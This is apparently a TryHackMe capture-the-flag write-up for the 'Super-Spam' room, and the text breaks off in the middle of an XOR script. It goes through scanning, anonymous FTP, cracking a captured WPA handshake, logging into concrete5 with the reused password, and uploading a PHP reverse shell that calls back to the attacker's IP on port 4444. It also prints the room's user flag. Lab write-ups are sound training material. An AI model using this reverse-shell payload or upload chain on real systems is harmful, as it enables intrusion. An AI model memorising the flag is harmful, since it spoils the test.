# Super-Spam — Writeup

## Overview
### Super-Spam — Writeup
### Super-Spam — Writeup
----
Defeat the evil Super-Spam, and save the day!!
----
![](https://tryhackme-images.s3.amazonaws.com/room-icons/f8f1345b6e420c2f12ab1cd9f1e2ede9.png)
Start Machine
**General Uvilix:**
Good Morning! Our intel tells us that he has returned. Super-spam, the evil alien villain from the planet Alpha Solaris IV from the outer reaches of the Andromeda Galaxy. He is a most wanted notorious cosmos hacker who has made it his lifetime mission to attack every Linux server possible on his journey to a Linux-free galaxy. As an avid Windows proponent, Super-spam has now arrived on Earth and has managed to hack into OUR Linux machine in pursuit of his ultimate goal. We must regain control of our server before it's too late! Find a way to hack back in to discover his next evil plan for total Windows domination! **Beware**, super-spam's evil powers are to confuse and deter his victims.
Credits: [ARZ101](https://tryhackme.com/p/ARZ101), [DrXploiter](https://tryhackme.com/p/DrXploiter), [Aksheet](https://tryhackme.com/p/Aksheet), [kiwiness](https://tryhackme.com/p/kiwiness), [wraith0p](https://tryhackme.com/p/wraith0p)
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.130.225 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.130.225:80
Open 10.10.130.225:4019
Open 10.10.130.225:5901
Open 10.10.130.225:6001
Open 10.10.130.225:4012
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.130.225 [5 ports]
Discovered open port 80/tcp on 10.10.130.225
Discovered open port 5901/tcp on 10.10.130.225
Discovered open port 6001/tcp on 10.10.130.225
Discovered open port 4012/tcp on 10.10.130.225
Discovered open port 4019/tcp on 10.10.130.225
Completed Connect Scan (5 total ports)
Initiating Service scan
Scanning 5 services on 10.10.130.225
Completed Service scan (5 services on 1 host)
NSE: Script scanning 10.10.130.225.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
NSE: [ftp-bounce 10.10.130.225:4019] PORT response: 500 Illegal PORT command.
NSE Timing: About 99.14% done; ETC: 20:20 (0:00:00 remaining)
NSE Timing: About 99.86% done; ETC: 20:21 (0:00:00 remaining)
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
NSE Timing: About 95.00% done; ETC: 20:22 (0:00:02 remaining)
NSE Timing: About 95.00% done; ETC: 20:22 (0:00:03 remaining)
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.130.225
Host is up, received user-set (0.18s latency).

PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.29
4012/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 866004c0a5364667f5c7240fdfd00314 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCjPfdefRhbpiW/oi5uUVtVRW/pYZcnADODOU4e80iSnuqWfRB5DAXTpzKZNw5JBQGy+4Amwz0DyX/TlYBgXRxPXwFimpBXnc02jpMknSaDzdRnInU8wFcsBQc+GraYz1mMHvRcco2FfIrKurDbyEsBCzwJuk/RKdSq2rcFLhq8QAPoxc9FQcNeUIZrBt53/7+fD7B7NvjjU22+hXZhjt6PLC3LDWcaMvpYCxMYGwKoC9xTs+FtzEFrt6yWzKrXV1iNuKdNyt8vu22bcPl2GrQ9ai9I89DEY4wB3dADP6AfNikbi0QWjdNbW2fhblG9PvKRu9s3IbpVueX2qBfInuAF
|   256 ced2f6ab697faa31f54970e58f62b0b7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIs/ZpOvCaKtCEwW4YraPciYLZnrRXDR6voHu0PipWaQpcdnsc8Vg1WMpkX0xgjXc9eD3NuZmBtTcIDTJXi7v4U=
|   256 73a0a197c433fbf44a5c77f6ac9576ac (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHHX1bbkvh6bRHE0hWipYWoYyh+Q+uy3E0yCBOoyY888
4019/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.19.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Feb 20  2021 IDS_logs
|_-rw-r--r--    1 ftp      ftp           526 Feb 20  2021 note.txt
5901/tcp open  vnc     syn-ack VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VNC Authentication (2)
|     Tight (16)
|   Tight auth subtypes: 
|_    STDV VNCAUTH_ (2)
6001/tcp open  X11     syn-ack (access denied)
Service Info: Host: example.com; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 171.50 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.130.225 4019
220 (vsFTPd 3.0.3)
^C
                                                                                                 
┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.130.225 4012
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
^C
                                                                                                 
┌──(witty㉿kali)-[~/Downloads]
└─$ nc 10.10.130.225 5901
RFB 003.008

┌──(witty㉿kali)-[~/Downloads]
└─$ ftp 10.10.130.225 4019
Connected to 10.10.130.225.
220 (vsFTPd 3.0.3)
Name (10.10.130.225:witty): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||48637|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Feb 20  2021 IDS_logs
-rw-r--r--    1 ftp      ftp           526 Feb 20  2021 note.txt
226 Directory send OK.
ftp> more note.txt
12th January: Note to self. Our IDS seems to be experiencing high volumes of unusual activity.
We need to contact our security consultants as soon as possible. I fear something bad is going
to happen. -adam

13th January: We've included the wireshark files to log all of the unusual activity. It keeps
occuring during midnight. I am not sure why.. This is very odd... -adam

15th January: I could swear I created a new blog just yesterday. For some reason it is gone... -a
dam

24th January: Of course it is... - super-spam :)

ftp> cd IDS_logs
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||49319|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp         14132 Feb 20  2021 12-01-21.req.pcapng
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed010.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed013.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed01h3.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed01ha.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed50n0.c
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed50n0.t
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed6.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed806.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed810.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed816.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammed86.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammeda1ha.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 13-01-21-spammedabha.s
-rw-r--r--    1 ftp      ftp         74172 Feb 20  2021 13-01-21.pcap
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed22n0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed22v0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed245a.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed245v.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed24ha.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed28v0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2a5v.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2bha.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2w5v.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2we8.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2wev.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2wv0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 14-01-21-spammed2wv8.s
-rw-r--r--    1 ftp      ftp         11004 Feb 20  2021 14-01-21.pcapng
-rw-r--r--    1 ftp      ftp         74172 Feb 20  2021 16-01-21.pcap
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 24-01-21-spammed22n0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 24-01-21-spammed50n0.a
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 24-01-21-spammed50n0.c
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 24-01-21-spammed50n0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 24-01-21-spammed52n0.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed00050.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed100.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed10050.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed10056.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed10086.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed11.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed12.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed12086.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed130.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed190.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed19046.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed1906.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed19086.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed2.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed200.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed205.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed23.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed280.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed285.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed3.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed4.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed410.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed430.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed480.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed490.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed7.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed72.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed75.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed80.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed81.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed82.s
-rw-r--r--    1 ftp      ftp             0 Feb 20  2021 spammed9.s
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> ls -lah
229 Entering Extended Passive Mode (|||40274|)
150 Here comes the directory listing.
drwxr-xr-x    4 ftp      ftp          4096 May 30  2021 .
drwxr-xr-x    4 ftp      ftp          4096 May 30  2021 ..
drwxr-xr-x    2 ftp      ftp          4096 May 30  2021 .cap
drwxr-xr-x    2 ftp      ftp          4096 Feb 20  2021 IDS_logs
-rw-r--r--    1 ftp      ftp           526 Feb 20  2021 note.txt
226 Directory send OK.
ftp> cd .cap
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||41417|)
150 Here comes the directory listing.
-rwxr--r--    1 ftp      ftp        370488 Feb 20  2021 SamsNetwork.cap
226 Directory send OK.
ftp> mget *
mget SamsNetwork.cap [anpqy?]? ye
229 Entering Extended Passive Mode (|||43967|)
150 Opening BINARY mode data connection for SamsNetwork.cap (370488 bytes).
100% |****************************************************|   361 KiB  226.10 KiB/s    00:00 ETA
226 Transfer complete.
370488 bytes received in 00:01 (196.89 KiB/s)
ftp> ls -lah
229 Entering Extended Passive Mode (|||42285|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 May 30  2021 .
drwxr-xr-x    4 ftp      ftp          4096 May 30  2021 ..
-rw-r--r--    1 ftp      ftp           249 Feb 20  2021 .quicknote.txt
-rwxr--r--    1 ftp      ftp        370488 Feb 20  2021 SamsNetwork.cap
226 Directory send OK.
ftp> more .quicknote.txt
It worked... My evil plan is going smoothly.
 I will place this .cap file here as a souvenir to remind me of how I got in...
 Soon! Very soon!
 My Evil plan of a linux-free galaxy will be complete.
 Long live Windows, the superior operating system!

┌──(witty㉿kali)-[~/Downloads]
└─$ wireshark SamsNetwork.cap

┌──(witty㉿kali)-[~/Downloads]
└─$ aircrack-ng SamsNetwork.cap 
Reading packets, please wait...
Opening SamsNetwork.cap
Read 9741 packets.
```

## Exploitation
```text
#  BSSID              ESSID                     Encryption

   1  D2:F8:8C:31:9F:17  Motocplus                 WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening SamsNetwork.cap
Read 9741 packets.

1 potential targets

Please specify a dictionary (option -w).

using rockyou wordlist

      [00:07:07] 799684/14344392 keys tested (1901.54 k/s) 

      Time left: 1 hour, 58 minutes, 43 seconds                  5.57%

                       Current passphrase: sandiago                   
                           KEY FOUND! [ sandiago ]

      Master Key     : 93 5E 0C 77 A3 B7 17 62 0D 1E 31 22 51 C0 42 92 
                       6E CF 91 EE 54 6B E1 E3 A8 6F 81 FF AA B6 64 E1 

      Transient Key  : 70 72 6D 26 15 45 F9 82 D4 AE A9 29 B9 E7 57 42 
                       7A 40 B4 D1 C3 27 EE 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
      EAPOL HMAC     : 1E FB DC A0 1D 48 49 61 3B 9A D7 61 66 71 89 B0 

┌──(witty㉿kali)-[~/Downloads]
└─$ aircrack-ng -w /usr/share/wordlists/rockyou.txt SamsNetwork.cap

https://vocal.com/secure-communication/eapol-extensible-authentication-protocol-over-lan/

Ctrl +shift +p preferences

find http

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 68
Date: Thu, 18 Feb 2021 16:10:51 GMT
Connection: keep-alive

<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>

┌──(witty㉿kali)-[~/Downloads]
└─$ curl http://10.10.154.35/ | head
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:-  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:-  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:-  0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:-  0     0    0     0    0     0      0      0 --:--:--  0:00:03 --:-  0     0    0     0    0     0      0      0 --:--:--  0:00:04 --:--:--     0<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="stylesheet" type="text/css" href="/concrete5/concrete/themes/elemental/css/bootstrap-modified.css">
    <link href="/concrete5/application/files/cache/css/elemental/main.css?ts=1617976151" rel="stylesheet" type="text/css" media="all">    
<title>Home :: Super-Spam</title>

<meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
<meta name="generator" content="concrete5 - 8.5.2"/>

http://10.10.51.105/concrete5/index.php/blog/linux-bloggerscom

Linux-Bloggers.com
Apr 9, 2021 Adam_Admin 

http://10.10.51.105/concrete5/index.php/blog/neque-porro-quisquam

Neque porro quisquam
Apr 9, 2021 Benjamin_Blogger 

http://10.10.51.105/concrete5/index.php/blog/ipsum

Ipsum
Apr 9, 2021 Lucy_Loser 

http://10.10.51.105/concrete5/index.php/blog/lorem

Lorem
Apr 9, 2021 Donald_Dump 

https://documentation.concretecms.org/user-guide/guided-tour/logging-in-and%20out

http://10.10.51.105/concrete5/index.php/login

Donald_Dump: sandiago

https://hackerone.com/reports/768322

┌──(witty㉿kali)-[~]
└─$ cat revshell.php 
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.19.103/4444 0>&1'");?>

http://superspam.thm/concrete5/index.php/dashboard/system

http://superspam.thm/concrete5/index.php/dashboard/system/files/filetypes

flv, jpg, gif, jpeg, ico, docx, xla, png, psd, swf, doc, txt, xls, xlsx, csv, pdf, tiff, rtf, m4a, mov, wmv, mpeg, mpg, wav, 3gp, avi, m4v, mp4, mp3, qt, ppt, pptx, kml, xml, svg, webm, ogg, ogv, php

http://superspam.thm/concrete5/index.php/dashboard/files/search

upload revshell

URL to File

http://superspam.thm/concrete5/application/files/7716/8868/6228/revshell.php

click

Tracked URL

http://superspam.thm/concrete5/index.php/download_file/18/0

Title

revshell.php

┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvp 4444                                       
listening on [any] 4444 ...
connect to [10.8.19.103] from superspam.thm [10.10.225.4] 60382
bash: cannot set terminal process group (875): Inappropriate ioctl for device
bash: no job control in this shell
<w/html/concrete5/application/files/7716/8868/6228$ which python
which python
<w/html/concrete5/application/files/7716/8868/6228$ which python3
which python3
/usr/bin/python3
<w/html/concrete5/application/files/7716/8868/6228$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<228$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<w/html/concrete5/application/files/7716/8868/6228$ whoami;hostname;id;ip a
whoami;hostname;id;ip a
www-data
super-spam
uid=33(www-data) gid=33(www-data) groups=33(www-data)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:dc:f6:67:c8:f7 brd ff:ff:ff:ff:ff:ff
    inet 10.10.225.4/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2601sec preferred_lft 2601sec
    inet6 fe80::dc:f6ff:fe67:c8f7/64 scope link 
       valid_lft forever preferred_lft forever
www-data@super-spam:/home/personal/Work$ find / -type f -name flag.txt 2>/dev/null
<nal/Work$ find / -type f -name flag.txt 2>/dev/null
/home/personal/Work/flag.txt

www-data@super-spam:/home/personal/Work$ cat flag.txt
cat flag.txt
user_flag: flag{-eteKc=skineogyls45«ey?t+du8}

www-data@super-spam:/home/personal/Work$ ls -lah /opt
ls -lah /opt
total 8.0K
drwxr-xr-x  2 root root 4.0K Apr 26  2018 .
drwxr-xr-x 22 root root 4.0K Apr  9  2021 ..
www-data@super-spam:/home/personal/Work$ ls -lah /dev/shm
ls -lah /dev/shm
total 0
drwxrwxrwt  2 root root   40 Jul  6 23:15 .
drwxr-xr-x 17 root root 3.7K Jul  6 23:15 ..
www-data@super-spam:/home/personal/Work$ ls -lah /mnt
ls -lah /mnt
total 8.0K
drwxr-xr-x  2 root root 4.0K Apr 26  2018 .
drwxr-xr-x 22 root root 4.0K Apr  9  2021 ..
www-data@super-spam:/home$ cd lucy_loser
cd lucy_loser
www-data@super-spam:/home/lucy_loser$ ls -lah
ls -lah
total 44K
drwxr-xr-x 7 lucy_loser lucy_loser 4.0K Apr  9  2021 .
drwxr-xr-x 7 root       root       4.0K Feb 20  2021 ..
drwxr-xr-x 2 lucy_loser lucy_loser 4.0K May 30  2021 .MessagesBackupToGalactic
lrwxrwxrwx 1 root       root          9 Apr  9  2021 .bash_history -> /dev/null
-rw-r--r-- 1 lucy_loser lucy_loser  220 Feb 20  2021 .bash_logout
-rw-r--r-- 1 lucy_loser lucy_loser 3.7K Feb 20  2021 .bashrc
drwx------ 2 lucy_loser lucy_loser 4.0K Feb 20  2021 .cache
drwx------ 3 lucy_loser lucy_loser 4.0K Feb 20  2021 .gnupg
-rw-r--r-- 1 lucy_loser lucy_loser  807 Feb 20  2021 .profile
-rw-r--r-- 1 root       root         28 Feb 24  2021 calcs.txt
drwxr-xr-x 2 root       root       4.0K Feb 24  2021 prices
drwxr-xr-x 2 root       root       4.0K Feb 24  2021 work
www-data@super-spam:/home/lucy_loser$ cat calcs.txt
cat calcs.txt
Suzy logs. to be completed.

www-data@super-spam:/home/lucy_loser$ cd .MessagesBackupToGalactic
cd .MessagesBackupToGalactic
www-data@super-spam:/home/lucy_loser/.MessagesBackupToGalactic$ ls -lah
ls -lah
total 1.7M
drwxr-xr-x 2 lucy_loser lucy_loser 4.0K May 30  2021 .
drwxr-xr-x 7 lucy_loser lucy_loser 4.0K Apr  9  2021 ..
-rw-r--r-- 1 lucy_loser lucy_loser 169K Apr  8  2021 c1.png
-rw-r--r-- 1 lucy_loser lucy_loser 168K Apr  8  2021 c10.png
-rw-r--r-- 1 lucy_loser lucy_loser 165K Apr  8  2021 c2.png
-rw-r--r-- 1 lucy_loser lucy_loser 168K Apr  8  2021 c3.png
-rw-r--r-- 1 lucy_loser lucy_loser 168K Apr  8  2021 c4.png
-rw-r--r-- 1 lucy_loser lucy_loser 164K Apr  8  2021 c5.png
-rw-r--r-- 1 lucy_loser lucy_loser 164K Apr  8  2021 c6.png
-rw-r--r-- 1 lucy_loser lucy_loser 168K Apr  8  2021 c7.png
-rw-r--r-- 1 lucy_loser lucy_loser 168K Apr  8  2021 c8.png
-rw-r--r-- 1 lucy_loser lucy_loser 170K Apr  8  2021 c9.png
-rw-r--r-- 1 lucy_loser lucy_loser  21K Apr  8  2021 d.png
-rw-r--r-- 1 lucy_loser lucy_loser  497 May 30  2021 note.txt
-rw-r--r-- 1 lucy_loser lucy_loser 1.2K Apr  8  2021 xored.py
www-data@super-spam:/home/lucy_loser/.MessagesBackupToGalactic$ cat note.txt
cat note.txt
Note to self. General super spam mentioned that I should not make the same mistake again of re-using the same key for the XOR encryption of our messages to Alpha Solaris IV's headquarters, otherwise we could have some serious issues if our encrypted messages are compromised. I must keep reminding myself,do not re-use keys,I have done it 8 times already!.The most important messages we sent to the HQ were the first and eighth message.I hope they arrived safely.They are crucial to our end goal.
www-data@super-spam:/home/lucy_loser/.MessagesBackupToGalactic$ cat xored.py
cat xored.py
from PIL import Image

print("[!] Note Add extention also.")

pic1_name=input("[-] Enter First Image: " )
pic2_name=input("[-] Enter Second Image: ")
out_name=input("[-] Enter Name of The output image:")

pic1=Image.open(pic1_name)
print("[+] Reading pic1")  #finding the size of picture1 
pic2=Image.open(pic2_name)
print("[+] Reading pic2") #finding the size of picture2

#pic2=pic1.resize(pic1.size) #resizing the pic2 according to pic1
#print("[+] pic2 resized Successfully.")

'''
so that we can xor each and every coordinate of both the pictures
'''

print(pic2) #After Resizing

x_cord_pic1=pic1.size[0]
y_cord_pic1=pic1.size[1]

newpic = Image.new('RGB',pic1.size) # Creating NEW image

for y in range(y_cord_pic1):
    for x in range(x_cord_pic1):
        pixel_1=pic1.getpixel((x,y))
        pixel_2=pic2.getpixel((x,y))
        newpixel =[]
        for p in range(len(pixel_1[:3])): #for all three values
